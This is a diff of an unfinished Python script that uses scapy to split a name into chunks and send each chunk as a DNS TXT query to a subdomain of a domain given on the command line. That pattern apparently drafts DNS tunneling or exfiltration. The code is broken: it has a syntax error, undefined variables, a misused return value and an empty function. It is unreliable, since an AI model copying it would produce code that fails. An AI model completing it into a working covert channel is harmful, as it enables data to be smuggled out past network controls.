@@ -25,6 +25,7 @@ def handle_option():
     # parser.add_argment('-f', action=)
     pass
 
+
 def separate(qname, length=10):
 
     """
@@ -41,20 +42,29 @@ def separate(qname, length=10):
     return domain # domain = {'0asdfasdf9', '0asdfasdf9', '0asdfasdf9')
 
 
-def query(domain):
+def query(subdomain):
 
-    """
+    """ 
     - Query the contents of TXT record
     """
 
+    DOMAIN = sys.argv[2]
+    request = "{0}.{1}".format(subdomain, DOMAIN)
+
+    answer = []
     for a in domain:
-        send(IP(_)/UDP(dport=53)/DNS(qd=DNSQR(qtype=txt)))
+        answer = send(IP(_)/UDP(dport=53)/DNS(qd=DNSQR(qname=request, qtype=txt))
+        answer.append()
+
+    return answer
+
+def parse():
+    
 
 
 def main(argv):
-    QNAME = sys.argv[1]
-    DOMAIN = sys.argv[2]
 
+    QNAME = sys.argv[1]
     query(separate(QNAME))
 
 
